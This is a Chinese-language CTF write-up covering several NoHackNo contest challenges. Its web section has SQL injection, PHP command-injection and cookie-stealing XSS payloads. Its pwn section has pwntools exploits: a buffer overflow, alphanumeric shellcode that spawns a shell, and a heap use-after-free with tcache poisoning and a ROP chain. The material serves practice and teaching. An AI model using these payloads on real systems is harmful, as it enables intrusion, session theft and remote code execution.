# NoHackNo CTF WriteUp

# Forensics

### Suspicious GIF
把這個 GIF 丟到 [ezgif]([ezgif](https://ezgif.com/split/ezgif-7-a5c9b84972.gif)) 中就能看到內容。
![](https://hackmd.io/_uploads/ryJpvlLzJe.png)

### Kohiro
改文件的 header 就能解出來。
![](https://hackmd.io/_uploads/r14WnHdM1l.jpg)

### BotNet1
到 etherscan 上查這個地址，找到 [[etherscan](https://sepolia.etherscan.io/address/0xad840c4c2f869896efe0891614faa1908dcd0153#internaltx)](https://sepolia.etherscan.io/address/0xad840c4c2f869896efe0891614faa1908dcd0153#internaltx)。
![](https://hackmd.io/_uploads/ByNdXoufkl.png)

# Crypto

### Duplicated
```python
import base64
from itertools import combinations
import requests
import json

# base64 編碼
data = base64.b64encode(b"whale_meowing").decode()

# 插入空格
def generate_variations(s):
    variations = set()
    n = len(s)
    # 一個空格
    for i in range(n + 1):
        var = s[:i] + ' ' + s[i:]
        variations.add(var)
    # 兩個空格
    for i, j in combinations(range(n + 1), 2):
        var = s[:i] + ' ' + s[i:j] + ' ' + s[j:]
        variations.add(var)
    return variations

vars = generate_variations(data)

# 檢查是否有效
decoded_variations = []
for var in vars:
    try:
        decoded = base64.b64decode(var)
        if decoded == b'whale_meowing':
            decoded_variations.append(var)
    except Exception:
        continue

if len(decoded_variations) < 200:
    raise ValueError("no more")
decoded_variations = decoded_variations[:200]
data_pairs = [[decoded_variations[i], decoded_variations[i + 1]] for i in range(0, 200, 2)]

# 確認所有輸入不重複
all_inputs = [item for pair in data_pairs for item in pair]
if len(set(all_inputs)) != len(all_inputs):
    raise ValueError("same input")

# 發送請求到 server
url = 'http://23.146.248.134:31337/check'
headers = {'Content-Type': 'application/json'}
response = requests.post(url, headers=headers, data=json.dumps(data_pairs))

print(response.status_code)
print(response.text)
```
```
output {"status":"NHNC{is_md_an_abbreviation_for_maid?}"}
```

# Misc

### Blog 1
去這個鏈接上可以看到答案：[GitHub]([](https://github.com/Neko-2077/Neko-2077.github.io/commit/c1c8a9db18610446d2f4bd9207edee771920b381#diff-db4d32685a032501848c0792fac12eaebefebe00a43ea200aa2a71d9abf0ed98))(https://github.com/Neko-2077/Neko-2077.github.io/commit/c1c8a9db18610446d2f4bd9207edee771920b381#diff-db4d32685a032501848c0792fac12eaebefebe00a43ea200aa2a71d9abf0ed98)。

### Blog 2

### Where is this
把圖片中的「河堤上的貓」丟到 Google 就能找到座標。

### 我的腳架在哪裡??
用 Google Lens 搜索之後發現它在蘇澳火車站附近，找到平交道後，再去 [what3words.com]([what3words](https://what3words.com/results.monkeys.commands)) 選定位置，就找到了。
![](https://hackmd.io/_uploads/Hy7itl8M1l.png)

### NHNC, but C0LoRfUl
在 Discord 中把身份組設為 staff 後，會有一個 flag 聊天欄，base64 解碼後就是答案。
![](https://hackmd.io/_uploads/ByHWsxLzke.png)

### Beep beep beep!
用 Audacity 分離出 DTMF 信號後得到：
```hex
4*484*437B48746270735#4736667D
```
然後用 CyberChef 把 hex 解密並修改參數後得到：
![](https://hackmd.io/_uploads/r1v-mCLzye.png)

### M0unta1n
我一開始看到這張照片就猜測它在台灣嘉義到高雄附近，而且應該是下午 2 點左右，方向是向西。然後我發現有鳳梨田和遠處的小山脈，後來提示說是在高雄，所以就從高雄開始找。
![](https://hackmd.io/_uploads/rkbHMouGyg.png)

從地形上看，鼓山區有一座山，拍攝者面向西邊，所以推測位置大約在鳥松區東邊的山上。
![](https://hackmd.io/_uploads/Skp-Xo_Mke.jpg)

在 Google Earth 中查看 3D 地圖，可以發現照片中偏左的位置有兩個像廟的屋頂，一個藍色一個橘色，所以我推測是在箭頭所指的位置。

用街景確認後，將上方的「松浦北巷」丟到郵局翻譯成英文，答案就出來了。
```
NHNC{Songpu N. Ln.}
```

# Web

### 哥布林保衞部公告
使用 `view-source` 查看原始碼就可以看到 flag。

### I need to get the C00kies
把 cookie 改成 admin 就能拿到 flag。

### Login
輸入 `'or 1=1--` 就能得到 flag。

### EASY METHOD
題目提示我們要使用 `PUT`：
```
curl -X PUT http://23.146.248.227:60001/
```

### 1 line php
題目用 `#` 把後面所有內容註解掉，可以用換行符（%0A）bypass：
```
?cmd=%0Acat /f*
```

### Democracy
按 F12 查看 network，會看到它轉到 next 再轉到 next.html。
用 curl 查 next.html 什麼都沒有。
next 會跑出兩段 JavaScript，第二段是 cloudflare，推測和題目無關，第一段有 console log。
所以回到網站，把 console 打開，按下按鈕後又被重新導向，但 flag 就顯示在 console 裡。

### miday
這是一個 XSS 題。
一開始的 payload 是：
```
'http://example.com?'+document.cookie
```
試了很多次後，我改成：
```
`http://example.com?${document.cookie}`
```
就成功了。

# Reverse

### easyyyyyyyyyy
下載之後用 `strings <filename> | grep 'NHNC'` 就能找到 flag。

### Here's the sauce

### Guess the num
![](https://hackmd.io/_uploads/H17K7L5MJg.png)
這是一個猜數字遊戲，程式會生成隨機數字，只要輸入的數字和隨機數字相同，就可以拿到 flag。

![](https://hackmd.io/_uploads/HJZ6mIqfke.png)
看起來很像 flag，但其實不是。

![](https://hackmd.io/_uploads/SkRCmUqfJl.png)
程式在 `_FINI_1` 還做了一些奇怪的事情。

![](https://hackmd.io/_uploads/SJ5Q4U5zyg.png)
使用 GDB 動態除錯發現這裡對 flag 做了修改。

![](https://hackmd.io/_uploads/SJbKEU5zyl.png)
在後面下個斷點，讓程式自己算完後直接獲取 flag。

### Yet Another password checker
這看起來是 electron 做的。
先檢查有沒有留 source code，結果是被打包成 app.asar。
上網查了一下，發現可以用這個命令解包：
```
npx @electron/asar extract app.asar ./dist
```
解包後，裡面有個 index.html，打開後看到很多看不懂的東西，註解說這是隱藏的程式，看起來像是 ASCII 的不可見字元，經過某種運算後可以執行。看到原始碼裡有個 eval，把它改成 console.log，得到一串 jsfuck，拿去解碼後就得到明文 flag。

# Pwn

### Grading system
看了 source code，發現可以利用漏洞拿到 flag。

### DOF
![image](https://hackmd.io/_uploads/r1647rqzkl.png)
這裡使用 `gets` 要求輸入（ln18），可能會造成 buffer overflow。
ln19 會比對 local_28 是否包含 `cat_sleeping`，如果有就會進入 `secret_d00r`，但 local_28 被寫死為 `cat_say_meow`，所以可以利用 ln18 的 buffer overflow 來覆寫。

![image](https://hackmd.io/_uploads/HyFbVBcGye.png)
這裡會創建兩個 chunk，一個 chunk (`__haystack`) 寫入 `whale_meowing`，另一個 chunk (`pcVar2`) 在 ln23 用 `gets` 請求輸入。

ln24 會比對 `__haystack` 是否包含 `pwn3d!!!`，我們可以利用 ln23 的 buffer overflow，覆寫 `__haystack`，這樣就能拿到 flag。

exploit:
```python
from pwn import *

#r = process("./chal_23")
r = remote("chal.nhnc.ic3dt3a.org", 2000)

payload = b"a"*16 + b"cat_sleeping\x00"
r.sendlineafter(b":", payload)

payload = b"a"*32 + b"pwn3d!!!\x00"
r.sendlineafter(b":", payload)

r.interactive()
```

### Filtered
```c
#include <stdio.h>

#define SHELLCODE_LENGTH 0x1000

int main() {
	char shellcode[SHELLCODE_LENGTH];

	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);

	puts("Speak English *ONLY* !!!");
	puts("No more crazy stuffs like binary !!!");
	scanf(" %[a-zA-Z0-9]", shellcode);
	((void (*)(void))shellcode)();
}
```
這段程式碼會開一個空間讓我們輸入，然後跳到那個空間執行。但輸入只能是英文字母（大小寫）、數字、空格。

可以用這個腳本來產生符合條件的 shellcode：https://github.com/veritas501/ae64

exploit:
```python
from ae64 import AE64
from pwn import *
context.arch='amd64'

r = remote("chal.nhnc.ic3dt3a.org", 2001)

# 生成 shellcode
shellcode = asm(shellcraft.sh())

# 生成符合條件的 shellcode
enc_shellcode = AE64().encode(shellcode)

r.recvlines(2)
r.sendline(enc_shellcode)

r.interactive()
```

### Fishbaby's Library
![](https://hackmd.io/_uploads/HywjIHqf1e.png)
Flag 在 Public Release 裡面。

### SLIME MACHINE REVENGE
![](https://hackmd.io/_uploads/SymTuS9z1x.png)
變數名稱我改過，但大致上就是創建一個 chunk，有一個陣列保存位址（`chunk_addr`），一個陣列保存大小（`size`），還有一個陣列標記 chunk 使用狀態（`using`）。

![](https://hackmd.io/_uploads/S1dutHqG1g.png)
但是 kill 的時候沒有清除 `size` 和 `chunk_addr`，只把 `using` 標記為 0。

![](https://hackmd.io/_uploads/S11qYB9zyg.png)
![](https://hackmd.io/_uploads/ByTcKScMkl.png)
但讀取（`get`）和寫入（`set`）完全不檢查 `using`，所以可以利用 use after free。

![](https://hackmd.io/_uploads/ByORYH5z1x.png)
Gift 免費給出 stack 的位址。

首先創建兩個 chunk，一個大小為 0x490，一個大小為 0x40，把兩個都釋放後，前者進入 unsorted bin，後者進入 tcache，這樣可以 leak 出 libc 和 heap 的位址，然後計算出 libc base 和 heap base。

接著進行 tcache attack，創建兩個 chunk（2 和 3），釋放兩個 chunk 後，它們的關係會是：
```
tcache[2]: (3) -> (2)
```
這時（3）的 next 指向（2），寫入（3）來修改 next 為 `tcache_perthread_struct` 的位址。

修改完成後再取兩個 chunk，後取到的 chunk（5）會分配到 `tcache_perthread_struct`，這樣就能控制 tcache，達到任意位址寫入的目的。

接著對（5）寫入，修改 `tcache_perthread_struct`，然後拿到一個接近 main return address 的 chunk，搭建 ROP chain 來構建 `execve("/bin/sh", 0, 0)`，最後執行 End 退出 main，跳到剛才搭的 ROP chain 上，拿到 shell。

exploit:
```python
from pwn import *

# r = process("./chal")
r = remote("23.146.248.196", 48763)

def create(size):
    r.sendlineafter(b">>>", b"1")
    r.sendlineafter(b":", str(size).encode())
def kill(idx):
    r.sendlineafter(b">>>", b"4")
    r.sendlineafter(b":", str(idx).encode())

gift = int(r.recvline().decode().split(":")[1], 16)
success("Gift -> %s"%hex(gift))
adrtg = gift + 0x30

create(0x490)
create(0x40)
kill(0)
kill(1)

r.sendlineafter(b">>>", b"2")
r.sendlineafter(b":", b"1")
r.recvuntil(b":")
heapadr = (u64(r.recv(6)+b"\x00\x00") - 0x20) << 4
success("Heap Base -> %s"%hex(heapadr))

r.sendlineafter(b">>>", b"2")
r.sendlineafter(b":", b"0")
r.recvuntil(b": ")
libcbase = (u64(r.recv(6)+b"\x00\x00")- 0x203b20)
success("Libc Base -> %s"%hex(libcbase))

create(0x100)
create(0x100)
kill(2)
kill(3)

writeadr = heapadr + 0xa0
writeadr = (writeadr) ^ (heapadr >> 12)
r.sendlineafter(b">>>", b"3")
r.sendlineafter(b":", b"3")
r.sendlineafter(b":", p64(writeadr))

create(0x100) # 4
create(0x100) # 5

r.sendlineafter(b">>>", b"3")
r.sendlineafter(b":", b"5")
r.sendlineafter(b":", p64(0)+p64(adrtg - 0x8))

create(0x40) # 6

binsh = libcbase + 0x001cb42f
poprdi = libcbase + 0x000000000010f75b
system = libcbase + 0x0000000000058740
payload = p64(0) + p64(poprdi) + p64(binsh) + p64(poprdi+1) + p64(system)
r.sendlineafter(b">>>", b"3")
r.sendlineafter(b":", b"6")
r.sendlineafter(b":", payload)

r.interactive()
```

